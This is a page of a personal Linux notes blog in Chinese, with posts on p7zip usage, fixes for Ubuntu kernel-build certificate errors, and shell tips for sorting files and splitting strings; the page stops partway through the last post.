<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"junyiha.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="工作学习笔记">
<meta property="og:type" content="website">
<meta property="og:title" content="junyi&#39;s blog">
<meta property="og:url" content="https://junyiha.github.io/page/31/index.html">
<meta property="og:site_name" content="junyi&#39;s blog">
<meta property="og:description" content="工作学习笔记">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="zhang junyi">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://junyiha.github.io/page/31/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>junyi's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">junyi's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">hahahahaha</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_2_%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2024-05-22-linux_2_95_p7zip/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/linux_2_%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2024-05-22-linux_2_95_p7zip/" class="post-title-link" itemprop="url">linux_2_95_p7zip</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>p7zip命令 详解</li>
</ul>
<h2 id="linux-p7zip命令-详解"><a href="#linux-p7zip命令-详解" class="headerlink" title="linux p7zip命令 详解"></a>linux p7zip命令 详解</h2><p><code>p7zip</code> 是一个基于7-Zip的开源文件压缩和解压缩工具，用于Linux平台。它提供了一个命令行界面，允许用户使用不同的选项来执行各种压缩和解压缩操作。以下是 <code>p7zip</code> 命令的一些常见用法和选项：</p>
<h3 id="1-压缩文件或目录："><a href="#1-压缩文件或目录：" class="headerlink" title="1. 压缩文件或目录："></a>1. 压缩文件或目录：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a [压缩文件名].7z [要压缩的文件或目录]</span><br></pre></td></tr></table></figure>

<h3 id="2-解压缩文件："><a href="#2-解压缩文件：" class="headerlink" title="2. 解压缩文件："></a>2. 解压缩文件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x [压缩文件名].7z</span><br></pre></td></tr></table></figure>

<h3 id="3-列出压缩文件中的内容："><a href="#3-列出压缩文件中的内容：" class="headerlink" title="3. 列出压缩文件中的内容："></a>3. 列出压缩文件中的内容：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z l [压缩文件名].7z</span><br></pre></td></tr></table></figure>

<h3 id="4-使用密码进行压缩和解压缩："><a href="#4-使用密码进行压缩和解压缩：" class="headerlink" title="4. 使用密码进行压缩和解压缩："></a>4. 使用密码进行压缩和解压缩：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7z a -p[密码] [压缩文件名].7z [要压缩的文件或目录]</span><br><span class="line">7z x -p[密码] [压缩文件名].7z</span><br></pre></td></tr></table></figure>

<h3 id="5-设置压缩级别："><a href="#5-设置压缩级别：" class="headerlink" title="5. 设置压缩级别："></a>5. 设置压缩级别：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -mx=[压缩级别] [压缩文件名].7z [要压缩的文件或目录]</span><br></pre></td></tr></table></figure>

<p>其中 <code>[压缩级别]</code> 是一个介于0和9之间的整数，0表示无压缩，9表示最高压缩率。</p>
<h3 id="6-指定压缩文件类型："><a href="#6-指定压缩文件类型：" class="headerlink" title="6. 指定压缩文件类型："></a>6. 指定压缩文件类型：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -t[压缩文件类型] [压缩文件名].[后缀名] [要压缩的文件或目录]</span><br></pre></td></tr></table></figure>

<p>例如，如果要创建一个tar格式的压缩文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -ttar [压缩文件名].tar [要压缩的文件或目录]</span><br></pre></td></tr></table></figure>

<h3 id="7-帮助和其他选项："><a href="#7-帮助和其他选项：" class="headerlink" title="7. 帮助和其他选项："></a>7. 帮助和其他选项：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z --help</span><br></pre></td></tr></table></figure>

<p>这将显示 <code>p7zip</code> 命令的所有可用选项和帮助信息。</p>
<p><code>p7zip</code> 命令非常灵活，并且可以用于各种情况下的文件压缩和解压缩操作。记住，在执行任何操作之前，最好先阅读它的帮助文档，以确保正确使用所需的选项。</p>
<h2 id="linux-p7zip命令-常用技巧"><a href="#linux-p7zip命令-常用技巧" class="headerlink" title="linux p7zip命令 常用技巧"></a>linux p7zip命令 常用技巧</h2><p>当使用 <code>p7zip</code> 命令时，以下是一些常用的技巧和技巧，可以提高效率并使操作更加方便：</p>
<ol>
<li><p><strong>批量压缩文件</strong>：使用通配符来压缩多个文件或目录。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a archive.7z file1.txt file2.txt directory/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>压缩文件并排除指定文件或目录</strong>：通过使用 <code>-x</code> 选项，可以在压缩时排除特定的文件或目录。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a archive.7z directory/ -x!*.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>显示压缩进度</strong>：通过使用 <code>-bsp1</code> 选项，可以在压缩或解压缩过程中显示进度百分比。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -bsp1 archive.7z directory/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>将压缩文件分卷</strong>：通过使用 <code>-v</code> 选项，可以将压缩文件分割成指定大小的卷。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -v1m archive.7z directory/</span><br></pre></td></tr></table></figure>

<p> 这会将压缩文件分割成1MB大小的卷。</p>
</li>
<li><p><strong>加密压缩文件</strong>：通过使用 <code>-p</code> 选项，可以指定密码来加密压缩文件。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -psecret archive.7z directory/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>解压特定文件</strong>：通过使用 <code>-o</code> 选项，可以指定解压缩文件的输出目录。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x archive.7z -ooutput_directory/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>压缩文件时保留文件权限</strong>：通过使用 <code>-m0=Copy</code> 选项，可以在压缩时保留文件的权限。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -m0=Copy archive.7z directory/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用其他压缩算法</strong>：除了默认的7z算法外，还可以使用其他压缩算法，如zip。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z a -tzip archive.zip directory/</span><br></pre></td></tr></table></figure></li>
</ol>
<p>这些技巧可以帮助你更有效地使用 <code>p7zip</code> 命令，并根据需要进行自定义。记住查看命令的帮助文档，以了解更多可用选项和功能。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_4_%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/2024-05-22-linux_4_%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91_%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/linux_4_%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/2024-05-22-linux_4_%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91_%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/" class="post-title-link" itemprop="url">linux_4_内核编译_常见错误</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>内核编译遇到的常见错误</li>
</ul>
<h2 id="编译内核报错-No-rule-to-make-target-‘debian-canonical-certs-pem‘-或-‘canonical-revoked-certs-pem‘-的解决方法"><a href="#编译内核报错-No-rule-to-make-target-‘debian-canonical-certs-pem‘-或-‘canonical-revoked-certs-pem‘-的解决方法" class="headerlink" title="编译内核报错 No rule to make target ‘debian&#x2F;canonical-certs.pem‘ 或 ‘canonical-revoked-certs.pem‘ 的解决方法"></a>编译内核报错 No rule to make target ‘debian&#x2F;canonical-certs.pem‘ 或 ‘canonical-revoked-certs.pem‘ 的解决方法</h2><ul>
<li><p>Ubuntu 编译 Linux 内核经常会遇到如下错误：</p>
</li>
<li><p>如果报错 canonical-certs.pem：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make[1]: *** No rule to make target <span class="string">&#x27;debian/canonical-certs.pem&#x27;</span>, needed by <span class="string">&#x27;certs/x509_certificate_list&#x27;</span>.  Stop.</span><br><span class="line">make: *** [Makefile:1868: certs] Error 2</span><br></pre></td></tr></table></figure></li>
<li><p>在命令行中执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts/config --disable SYSTEM_TRUSTED_KEYS</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果报错 canonical-revoked-certs.pem：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-revoked-certs.pem&#x27;, needed by &#x27;certs/x509_revocation_list&#x27;.  Stop.</span><br><span class="line">make: *** [Makefile:1868: certs] Error 2</span><br></pre></td></tr></table></figure></li>
<li><p>在命令行中执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts/config --disable SYSTEM_REVOCATION_KEYS</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/shell_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-shell_2_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/shell_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-shell_2_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">shell_2_2_常用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>shell编程常用技巧</li>
</ul>
<h2 id="linux-目录下按照规则排序文件"><a href="#linux-目录下按照规则排序文件" class="headerlink" title="linux 目录下按照规则排序文件"></a>linux 目录下按照规则排序文件</h2><p>在 Linux 中，可以使用 <code>ls</code> 命令结合不同的选项来按照规则排序目录下的文件。以下是一些常用的示例和方法：</p>
<h3 id="1-按文件名排序"><a href="#1-按文件名排序" class="headerlink" title="1. 按文件名排序"></a>1. 按文件名排序</h3><p>默认情况下，<code>ls</code> 命令按文件名的字母顺序排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<h3 id="2-按文件大小排序"><a href="#2-按文件大小排序" class="headerlink" title="2. 按文件大小排序"></a>2. 按文件大小排序</h3><p>使用 <code>-S</code> 选项按文件大小排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lS</span><br></pre></td></tr></table></figure>

<h3 id="3-按修改时间排序"><a href="#3-按修改时间排序" class="headerlink" title="3. 按修改时间排序"></a>3. 按修改时间排序</h3><p>使用 <code>-t</code> 选项按修改时间排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lt</span><br></pre></td></tr></table></figure>

<h3 id="4-按访问时间排序"><a href="#4-按访问时间排序" class="headerlink" title="4. 按访问时间排序"></a>4. 按访问时间排序</h3><p>使用 <code>-u</code> 选项按访问时间排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lu</span><br></pre></td></tr></table></figure>

<h3 id="5-按文件创建时间排序（有些文件系统不支持）"><a href="#5-按文件创建时间排序（有些文件系统不支持）" class="headerlink" title="5. 按文件创建时间排序（有些文件系统不支持）"></a>5. 按文件创建时间排序（有些文件系统不支持）</h3><p>使用 <code>-c</code> 选项按文件创建时间排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lc</span><br></pre></td></tr></table></figure>

<h3 id="6-逆序排序"><a href="#6-逆序排序" class="headerlink" title="6. 逆序排序"></a>6. 逆序排序</h3><p>使用 <code>-r</code> 选项逆序排列：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lr</span><br></pre></td></tr></table></figure>

<h3 id="7-按扩展名排序"><a href="#7-按扩展名排序" class="headerlink" title="7. 按扩展名排序"></a>7. 按扩展名排序</h3><p>使用 <code>--sort=extension</code> 按扩展名排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l --<span class="built_in">sort</span>=extension</span><br></pre></td></tr></table></figure>

<h3 id="8-按文件大小排序并显示人类可读格式"><a href="#8-按文件大小排序并显示人类可读格式" class="headerlink" title="8. 按文件大小排序并显示人类可读格式"></a>8. 按文件大小排序并显示人类可读格式</h3><p>使用 <code>-h</code> 选项结合 <code>-S</code> 选项：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lSh</span><br></pre></td></tr></table></figure>

<h3 id="9-按指定规则排序文件"><a href="#9-按指定规则排序文件" class="headerlink" title="9. 按指定规则排序文件"></a>9. 按指定规则排序文件</h3><p>结合 <code>find</code> 和 <code>sort</code> 命令，可以按照更加复杂的规则进行排序。例如，按文件大小排序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; + | <span class="built_in">sort</span> -k 5 -n</span><br></pre></td></tr></table></figure>

<h3 id="10-按文件名排序，并忽略大小写"><a href="#10-按文件名排序，并忽略大小写" class="headerlink" title="10. 按文件名排序，并忽略大小写"></a>10. 按文件名排序，并忽略大小写</h3><p>使用 <code>-f</code> 选项结合 <code>sort</code> 命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">sort</span> -f</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设有一个目录，里面包含以下文件：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file1.txt</span><br><span class="line">file2.txt</span><br><span class="line">fileA.txt</span><br><span class="line">fileB.txt</span><br><span class="line">file10.txt</span><br></pre></td></tr></table></figure>

<p><strong>按文件名排序（忽略大小写）</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">sort</span> -f</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file1.txt</span><br><span class="line">file10.txt</span><br><span class="line">file2.txt</span><br><span class="line">fileA.txt</span><br><span class="line">fileB.txt</span><br></pre></td></tr></table></figure>

<p><strong>按文件大小排序</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lS</span><br></pre></td></tr></table></figure>

<p>输出（假设文件大小分别为 100B, 200B, 150B, 50B, 250B）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 user group  250 Apr 10 10:00 file10.txt</span><br><span class="line">-rw-r--r-- 1 user group  200 Apr 10 10:00 file2.txt</span><br><span class="line">-rw-r--r-- 1 user group  150 Apr 10 10:00 fileA.txt</span><br><span class="line">-rw-r--r-- 1 user group  100 Apr 10 10:00 file1.txt</span><br><span class="line">-rw-r--r-- 1 user group   50 Apr 10 10:00 fileB.txt</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过结合使用 <code>ls</code> 命令的不同选项以及 <code>sort</code> 命令，你可以根据各种规则对目录下的文件进行排序。选择适合你需求的命令和选项，并根据需要进行调整。</p>
<h2 id="shell-字符串分割"><a href="#shell-字符串分割" class="headerlink" title="shell 字符串分割"></a>shell 字符串分割</h2><p>在 Shell 中，可以使用多种方法来分割字符串。下面是几种常见的方法：</p>
<h3 id="1-使用-IFS（内部字段分隔符）"><a href="#1-使用-IFS（内部字段分隔符）" class="headerlink" title="1. 使用 IFS（内部字段分隔符）"></a>1. 使用 <code>IFS</code>（内部字段分隔符）</h3><p>使用 <code>IFS</code> 变量可以轻松地将字符串分割成数组。以下是一个示例，将逗号分隔的字符串分割成数组：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;apple,banana,cherry&quot;</span></span><br><span class="line">IFS=<span class="string">&#x27;,&#x27;</span> <span class="built_in">read</span> -r -a array &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$str</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出数组元素</span></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;array[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$element</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="2-使用-cut"><a href="#2-使用-cut" class="headerlink" title="2. 使用 cut"></a>2. 使用 <code>cut</code></h3><p><code>cut</code> 命令可以从字符串中提取字段。以下是一个示例，使用逗号作为分隔符：</p>
